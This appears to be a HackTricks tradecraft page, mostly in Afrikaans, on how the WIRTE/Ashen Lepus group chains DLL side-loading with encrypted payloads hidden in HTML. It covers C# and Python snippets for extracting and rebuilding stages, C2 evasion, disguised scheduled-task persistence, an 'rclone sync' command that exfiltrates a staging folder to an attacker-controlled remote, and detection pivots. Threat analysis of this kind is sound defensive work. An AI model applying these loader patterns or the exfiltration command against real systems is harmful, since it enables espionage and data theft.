# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Oorsig

Ashen Lepus (aka WIRTE) het 'n herhaalbare patroon gewapen wat DLL sideloading, staged HTML payloads, en modulêre .NET backdoors ketting om binne Midde-Oosterse diplomatieke netwerke te volhard. Die tegniek is herbruikbaar deur enige operator omdat dit op die volgende staatmaak:

- **Archive-based social engineering**: goedaardige PDFs instrueer teikens om 'n RAR-archive van 'n file-sharing site af te haal. Die archive bundle 'n werklik-lykende document viewer EXE, 'n malicious DLL benoem na 'n vertroude library (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en 'n lokaas `Document.pdf`.
- **DLL search order abuse**: die slagoffer dubbelklik die EXE, Windows resolve die DLL import vanaf die current directory, en die malicious loader (AshenLoader) execute inside die trusted process terwyl die lokaas PDF oopmaak om suspicion te vermy.
- **Living-off-the-land staging**: elke latere stage (AshenStager → AshenOrchestrator → modules) word van disk af gehou totdat dit nodig is, delivered as encrypted blobs hidden inside otherwise harmless HTML responses.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-load AshenLoader, wat host recon doen, AES-CTR dit encrypt, en dit POST inside roterende parameters soos `token=`, `id=`, `q=`, of `auth=` na API-lykende paths (bv. `/api/v2/account`).
2. **HTML extraction**: die C2 verraai die volgende stage slegs wanneer die client IP geolocates na die target region en die `User-Agent` ooreenstem met die implant, wat sandboxes frustreer. Wanneer die checks slaag bevat die HTTP body 'n `<headerp>...</headerp>` blob met die Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager word ontplooi met 'n ander legit binary wat `wtsapi32.dll` import. Die malicious copy injected into die binary fetch meer HTML, hierdie keer deur `<article>...</article>` uit te carve om AshenOrchestrator te recover.
4. **AshenOrchestrator**: 'n modulêre .NET controller wat 'n Base64 JSON config decode. Die config se `tg` en `au` fields word saamgevoeg/gehash in die AES key, wat `xrk` decrypt. Die resulting bytes werk as 'n XOR key vir elke module blob wat daarna fetched word.
5. **Module delivery**: elke module word beskryf deur HTML comments wat die parser na 'n arbitrary tag redirect, wat static rules breek wat net na `<headerp>` of `<article>` kyk. Modules sluit persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), en file exploration (`FE`) in.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selfs al blokkeer of stroop verdedigers ’n spesifieke element, hoef die operateur net die tag te verander wat in die HTML-kommentaar aangedui word om die aflewering te hervat.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Onlangse HTML smuggling-navorsing (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-bloke in HTML-aanhegsels versteek is en tydens runtime via JavaScript gedecodeer word. Dieselfde truuk kan hergebruik word vir C2 responses: stage encrypted blobs binne ’n script tag (of ander DOM element) en decodeer hulle in-memory voor AES/XOR, sodat die page soos gewone HTML lyk. Talos wys ook gelaagde obfuscation (identifier hernoeming plus Base64/Caesar/AES) binne script tags, wat skoon ooreenstem met HTML-staged C2 blobs. ’n Latere Talos writeup oor **hidden text salting** is ook hier relevant: om Base64 met irrelevante HTML comments of whitespace te verdeel is genoeg om eenvoudige regex extractors te breek terwyl browser-side reconstruction triviaal bly.

## Recent Variant Notes (2024-2025)

- Check Point het WIRTE campaigns in 2024 waargeneem wat steeds op archive-based sideloading gesteun het maar `propsys.dll` (stagerx64) as die eerste stage gebruik het. Die stager decodeer die volgende payload met Base64 + XOR (key `53`), stuur HTTP requests met ’n hardcoded `User-Agent`, en haal encrypted blobs uit wat tussen HTML tags ingebed is. In een branch is die stage herbou vanaf ’n lang lys embedded IP strings wat via `RtlIpv4StringToAddressA` gedecodeer is, en dan in die payload bytes aaneengeskakel is.
- OWN-CERT het vroeëre WIRTE tooling gedokumenteer waar die side-loaded `wtsapi32.dll` dropper strings met Base64 + TEA beskerm het en die DLL name self as die decryption key gebruik het, en daarna host identification data met XOR/Base64 obfuscate voordat dit na die C2 gestuur is.

## Reconstructing IP-Encoded Stages

WIRTE se 2024 `propsys.dll` branch wys dat die next PE nie as een aaneenlopende HTML blob hoef te bestaan nie. Die loader kan stage bytes as dotted-quad strings stoor en hulle met `RtlIpv4StringToAddressA` herbou, ’n patroon wat nou verwant is aan Hive se **IPfuscation** tradecraft. Operasioneel is dit nuttig wanneer die actor wil hê die HTML page moet lyk soos onskadelike IOCs of config data in plaas van ’n ooglopende Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
As die herwonne grepe met `MZ` begin, het jy waarskynlik die volgende PE direk gerekonstrueer. Indien nie, kyk vir `n` voorste XOR/Base64-laag of klein skeidingstukke tussen adresse.

## Verwisselbare DLL Name & Host Rotation

`n Sterk eienskap van hierdie patroon is dat die **HTML/AES/XOR staging backend identies kan bly terwyl slegs die sideload-paar verander**. WIRTE het deur veldtogte heen tussen `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, en `propsys.dll` geroteer, wat nuttig is omdat:

- `propsys.dll` en `wtsapi32.dll` is vervelige Windows DLL name wat verdedigers verwag om in `%System32%` / `%SysWOW64%` te bestaan.
- Publieke katalogusse soos **HijackLibs** karteer reeds baie binaries wat daardie DLL name vanaf `n` gekopieerde toepassinggids sal laai, wat operateurs vervangende hosts gee sonder om die stager te herontwerp.
- Slegs die export surface moet per host aangepas word. Die HTML parser, AES/XOR routines, en module loader kan gewoonlik onveranderd na `n` forwarding proxy DLL oorgedra word.

Vir offensiewe labwerk beteken dit dat jy die probleem kan verdeel in **(1) vind `n` stabiele getekende host wat jou gekose DLL name plaaslik oplos** en **(2) hergebruik dieselfde staged-HTML loader logic agter daardie DLL**.

## Crypto & C2 Hardening

- **AES-CTR oral**: huidige loaders bevat 256-bit keys plus nonces (bv. `{9a 20 51 98 ...}`) en voeg opsioneel `n` XOR-laag by met strings soos `msasn1.dll` voor/na dekripsie.
- **Key material variasies**: vroeër loaders het Base64 + TEA gebruik om ingebedde strings te beskerm, met die dekripsiesleutel afgelei van die kwaadwillige DLL naam (bv. `wtsapi32.dll`).
- **Infrastruktuur-splitsing + subdomein-kamoeflering**: staging servers word per tool geskei, oor verskillende ASNs gehuisves, en soms deur legitiem-lykende subdomeine gefront, sodat die brand van een stage nie die res blootstel nie.
- **Recon smuggling**: geïndentifiseerde data sluit nou Program Files-lysings in om hoëwaarde-apps raak te sien en word altyd geïnkripteer voordat dit die host verlaat.
- **URI churn**: query parameters en REST paths roteer tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose detecties ongeldig maak.
- **User-Agent pinning + safe redirects**: C2 infrastruktuur reageer slegs op presiese UA strings en herlei andersins na onskuldige nuus/gesondheid-webwerwe om in te pas.
- **Gated delivery**: servers is geo-fenced en antwoord slegs regte implants. Ongemagtigde clients ontvang onverdagte HTML.

## Persistence & Execution Loop

AshenStager laat scheduled tasks val wat voorgee as Windows maintenance jobs en via `svchost.exe` uitvoer, bv.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Hierdie tasks herbegin die sideloading-ketting by boot of op intervalle, wat verseker dat AshenOrchestrator vars modules kan aanvra sonder om weer aan disk te raak.

## Using Benign Sync Clients for Exfiltration

Operateurs stage diplomatieke dokumente binne `C:\Users\Public` (wêreldleesbaar en nie verdag nie) deur `n` toegewyde module, en laai dan die wettige [Rclone](https://rclone.org/) binary af om daardie gids met aanvaller-berging te sinkroniseer. Unit42 merk op dat dit die eerste keer is dat hierdie akteur waargeneem is wat Rclone vir exfiltration gebruik, in lyn met die breër tendens om wettige sync tooling te misbruik om in normale verkeer in te pas:

1. **Stage**: kopieer/versamel teikenlêers in `C:\Users\Public\{campaign}\`.
2. **Configure**: stuur `n` Rclone config wat wys na `n` aanvaller-beheerde HTTPS endpoint (bv. `api.technology-system[.]com`).
3. **Sync**: voer `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` uit sodat die verkeer soos normale cloud backups lyk.

Omdat Rclone wyd gebruik word vir wettige backup workflows, moet verdedigers fokus op afwykende uitvoerings (nuwe binaries, vreemde remotes, of skielike sinkronisering van `C:\Users\Public`).

## Detection Pivots

- Waarsku op **getekende prosesse** wat onverwags DLLs vanaf user-writable paths laai (Procmon filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL name oorvleuel met `netutils`, `srvcli`, `dwampi`, `wtsapi32`, of `propsys`.
- Inspekteer verdagte HTTPS responses vir **groot Base64 blobs ingebed binne ongewone tags** of beskerm deur `<!-- TAG: <xyz> -->` comments.
- Normaliseer HTML eers: **verwyder comments en maak whitespace saam voor Base64 extraction**, omdat hidden-text-salting styl evasie payloads oor comment boundaries kan verdeel.
- Brei HTML hunting uit na **Base64 strings binne `<script>` blocks** (HTML smuggling-styl staging) wat via JavaScript gedecodeer word voor AES/XOR processing.
- Soek vir herhaalde aanroepe na **`RtlIpv4StringToAddressA` gevolg deur buffer assembly**, veral wanneer die omliggende strings lang IPv4-lyste eerder as regte netwerkdoelwitte is.
- Soek vir **scheduled tasks** wat `svchost.exe` met nie-service arguments laat loop of terugwys na dropper directories.
- Volg **C2 redirects** wat slegs payloads vir presiese `User-Agent` strings teruggee en andersins na wettige nuus/gesondheid-domeine bons.
- Monitor vir **Rclone** binaries wat buite IT-bestuurde liggings verskyn, nuwe `rclone.conf` lêers, of sync jobs wat vanaf staging directories soos `C:\Users\Public` trek.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
